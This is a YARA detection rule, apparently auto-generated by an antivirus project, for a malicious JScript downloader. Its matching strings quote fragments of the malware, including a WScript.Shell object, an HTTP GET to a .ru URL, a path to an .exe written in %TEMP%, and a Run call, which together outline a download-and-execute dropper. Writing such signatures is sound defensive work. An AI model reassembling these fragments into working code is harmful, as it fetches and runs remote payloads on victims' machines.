rule sig_20160330_085ef6be25c07bf9dc75b1b8d576bb4c {
  meta:
    description = "datamaliciousorder - file 20160330_085ef6be25c07bf9dc75b1b8d576bb4c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "327fa6643562dbd7943ca53ccea0e4902dce8736d7098215ffeb7f3bcb6f8d38"

  strings:
    $s1  = "var T = function V() {return WScript[V0](\"WScript\"+\".Shell\");}(), X = 11;" fullword ascii
    $s2  = "function C0(ZP, J0){Z = Z * 1; return ZP - J0;};" fullword ascii
    $s3  = "RS[TX](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s4  = "if (RS[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FE() {return T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KaDRXcczDASK5J.ex\" + \"e\";};" fullword ascii
    $s6  = "function E(){return D0 + \"\";};" fullword ascii
    $s7  = "function C(A1){T[\"Run\"](A1, Z, Z);};" fullword ascii
    $s8  = "function BI() {return ((W == true) && (W == WF)) ? 1 : Z;};" fullword ascii
    $s9  = "function P(){return 22;};" fullword ascii
    $s10 = "var BL = new this[\"Date\"]();" fullword ascii
    $s11 = "return C0(P0, XC);" fullword ascii
    $s12 = "}while (FZ);" fullword ascii
    $s13 = "function O(R0) {var WQ = (1, 2, 3, 4, 5, R0); return WQ;};" fullword ascii
    $s14 = "function R()" fullword ascii
    $s15 = "function E0(){return V0;};" fullword ascii
    $s16 = "var Z0 = false;" fullword ascii
    $s17 = "var W = false;" fullword ascii
    $s18 = "W = true; " fullword ascii
    $s19 = "var WF = false;" fullword ascii
    $s20 = "WF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}